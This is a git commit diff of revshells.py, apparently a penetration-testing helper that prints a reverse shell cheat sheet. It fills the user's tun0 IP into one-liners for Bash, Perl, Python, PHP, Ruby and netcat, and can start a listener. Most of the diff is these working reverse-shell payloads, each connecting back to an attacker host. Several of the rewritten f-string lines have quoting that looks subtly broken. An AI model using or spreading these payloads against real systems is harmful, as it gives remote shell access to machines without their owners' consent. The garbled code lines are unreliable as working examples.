b78e6ef361e32db6c5e1eb7e0f57c3fb57a705a0
Swafox <25106596+Swafox@users.noreply.github.com>
2020-07-02 15:51:18 +0000

    v1.1 [~Stable]

--- revshells.py
+++ revshells.py
@@ -14,15 +14,15 @@ class bcolors:
 print(f"{bcolors.HEADER}Reverse Shell Cheat Sheet\n")
 
 # Setup parser
-parser = optparse.OptionParser(usage = "%prog -l [language] -p [1-9999]")
+parser = optparse.OptionParser(usage = "revshells.py -l [language] -p [1-9999]")
 parser.add_option("-l", "--lang", dest="lang", help="Shell type: Bash, Perl, Python, PHP, Ruby, Netcat")
 parser.add_option("-p", "--port", dest="port", help="Port to listen on. 0 = no listener")
 
 (options, args) = parser.parse_args()
 
 lang = str(options.lang)
-lang = lang.lower()
 port = options.port
+lang = lang.lower()
 
 # Getting the tun0
 def pull_tun0():
@@ -38,26 +38,25 @@ except:
 
 print("tun0 IP:" + tun0)
 print("Port:" + port)
-
 # Cheat sheet
 
 # Bash
-bash = "bash -i >& /dev/tcp/"+tun0+"/1234 0>&1"
+bash = f"bash -i >& /dev/tcp/{tun0}/1234 0>&1"
 
 # PERL
-perl = "perl -e 'use Socket;$i="+tun0+""";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
+perl = f"perl -e 'use Socket;$i="+tun0+";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("+"tcp"+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+">&S"+");open(STDOUT,"+">&S"+");open(STDERR,"+">&S"+");exec(""+/bin/sh -i"+");};'"
 
 # Python
-python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+tun0+""",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """
+python = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+tun0+",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["+"/bin/sh"+","+"-i"+"]);' "
 
 # PHP
-php = "php -r '$sock=fsockopen("+tun0+""",1234);exec("/bin/sh -i <&3 >&3 2>&3");'"""
+php = f"php -r '$sock=fsockopen("+tun0+",1234);exec("+"/bin/sh -i <&3 >&3 2>&3"+");'"
 
 # Ruby
-ruby = "ruby -rsocket -e'f=TCPSocket.open("+tun0+""",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+ruby = f"ruby -rsocket -e'f=TCPSocket.open("+tun0+",1234).to_i;exec sprintf("+"/bin/sh -i <&%d >&%d 2>&%d"+",f,f,f)'"
 
 # Netcat
-netcat = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+tun0+" 1234 >/tmp/f"
+netcat = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {tun0} 1234 >/tmp/f"
 
 
 if (lang == "bash"):
@@ -75,7 +74,7 @@ if (lang == "netcat" or lang == "nc"):
 
 # Listener
 if (port != 0):
-    print("Setting up listener...")
+    print("Setting up listener...") # + port
     import subprocess
 
     while 1:
